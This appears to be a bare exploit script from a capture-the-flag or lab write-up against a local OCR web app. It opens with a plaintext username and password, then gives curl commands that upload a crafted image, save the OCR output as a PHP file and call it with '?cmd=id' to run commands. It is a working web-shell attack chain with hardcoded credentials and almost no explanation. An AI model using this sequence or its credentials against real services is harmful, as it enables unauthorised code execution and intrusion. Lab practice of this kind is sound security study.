
walter:JbhHDAEgXvri3!


```
# 1. Run the curl commands exactly as shown in the write-up
U='walter:JbhHDAEgXvri3!'
BASE='http://127.0.0.1:8001'
D=/tmp/ocrpayload
cj="$D/cookies.txt"

# Create the directory if it doesn't exist
mkdir -p "$D"
rm -f "$cj"

# Encode the image
b64=$(base64 -w0 /tmp/payload.png)

# Send the image to OCR
curl -sS -u "$U" -c "$cj" -b "$cj" -X POST "$BASE/" \
  --data-urlencode "canvas_image=data:image/png;base64,$b64" \
  -o "$D/response.html"

# Check the response for the OCR ID
grep -nEi 'output-text|ocr_id|filename|notice|error' "$D/response.html"

# Extract the OCR ID
oid=$(grep -oE 'name="ocr_id" value="[^"]+' "$D/response.html" | sed 's/.*value="//' | tail -1)
echo "oid=$oid"

# Save the OCR output as a PHP file
curl -sS -u "$U" -c "$cj" -b "$cj" -X POST "$BASE/" \
  --data-urlencode "ocr_id=$oid" \
  --data-urlencode "filename=r.php" \
  --data-urlencode "save_output=Save" \
  -o "$D/save.html"

# Check if it saved successfully
grep -nEi 'saved|error|notice|invalid|permission|denied' "$D/save.html" | head -30

curl -s -u walter:'JbhHDAEgXvri3!' \
  "http://127.0.0.1:8001/saved/r.php?cmd=id"
  
```



